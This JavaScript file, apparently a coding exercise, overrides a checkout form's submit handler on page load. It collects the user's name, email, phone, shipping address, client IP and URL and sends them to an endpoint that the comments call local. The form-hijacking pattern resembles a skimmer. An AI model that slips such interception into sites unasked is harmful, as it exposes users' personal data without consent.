import $ from 'jquery';
import { getIp, sendPayload } from '../models/model';

// use jQuery ready funciton to execute hijackForm() function on DOM ready
// using jQuery ensures this function will trigger as intended on most browsers
$(document).ready(function(){
  hijackForm();
});

// this function is executed automatically on DOM ready by jQuery
// it removes the 'onclick' attribute for #submit_button
// and adds a jQuery click event listener to fire the sendData() function
// this function prevents all previously bound event handlers from firing
function hijackForm() {
  $('#submit_button').attr('onclick', '');
  $('#submit_button').click((event) => { 
    event.preventDefault();
    sendData(event)
  });
}

// the payload object is obtained from the createPayload() function, then
// stringified and sent by axios to a local endpoint by way of the model
// when the promise resolves, we either redirect user or alert an error
function sendData(event) {
  const payloadObject = createPayload()
  .then((payload) => {
    const url = payload.session.current_url;
    console.log('payload', payload, 'url', url);

    sendPayload(payload)
    .then( response => {
      console.log('response.data', response.data)
      if (response.data.result == 'ok') {
        debugger
        window.location.replace(url);  // <----------------  ??????
      } else {
        alert('The request failed!');
      }
    })
  });
}

// createPayload() makes a call for client's IP address through model
// when promise resolves, payload object is created from form data
function createPayload() {
  return getIp()
  .then(function(ip) {
    console.log('ip address', ip)
    return {
      user: {
        name: document.getElementById('user[name]').value,
        email: document.getElementById('user[email]').value,
        telephone: document.getElementById('user[telephone]').value
      },
      shipping: {
        street_1: document.getElementById('address[street_1]').value,
        street_2: document.getElementById('address[street_2]').value,
        city: document.getElementById('address[city]').value,
        state: document.getElementById('address[state]').text,
        zip: document.getElementById('address[zip]').value,
        country: "US"
      },
      session: {
        current_url: window.location.href,
        ip_address: ip.data.query
      }
    }
  })
}